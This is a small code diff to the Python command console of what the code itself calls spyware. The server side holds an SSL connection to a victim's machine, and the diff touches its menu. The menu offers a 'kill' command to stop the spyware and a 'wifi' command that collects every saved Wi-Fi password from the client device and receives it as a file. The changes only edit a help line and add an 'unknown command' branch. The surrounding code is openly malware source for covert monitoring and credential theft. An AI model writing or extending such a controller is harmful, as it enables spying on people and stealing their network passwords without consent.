@@ -14,7 +14,7 @@ def loop(port, host, client_ssl, ip_client):
                     \n✅ on Server: {host}
                     \n✅ Connected to Client IP: {str(ip_client)}
                     \n• 'k'/'kill' to stop the spyware and save the result of the client
-                    \n• 'wifi' to save all the past password ESSID save on the client device""")
+                    \n• 'wifi' to save all the past password ESSID save on the client device only on windows device""")
         cli = terminal()
         if cli == "kill" or cli == "k":
             print(f"Connection stopped with the client {ip_client}")
@@ -30,3 +30,5 @@ def loop(port, host, client_ssl, ip_client):
             receive_file(client_ssl,filename)
             print(f"{colors.green}Wifi_result Successfuly Save")
             terminal()
+        else:
+            print(f"{colors.red}❌ unknown command")
